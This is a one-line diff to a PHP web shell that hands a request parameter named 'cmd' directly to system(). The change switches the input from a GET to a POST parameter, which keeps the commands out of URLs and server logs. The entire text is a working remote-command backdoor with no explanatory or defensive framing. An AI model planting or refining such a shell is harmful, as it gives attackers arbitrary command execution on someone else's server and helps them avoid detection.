@@ -1,1 +1,1 @@
-<?php echo "Shell";system($_GET['cmd']); ?>
+<?php echo "Shell";system($_POST['cmd']); ?>
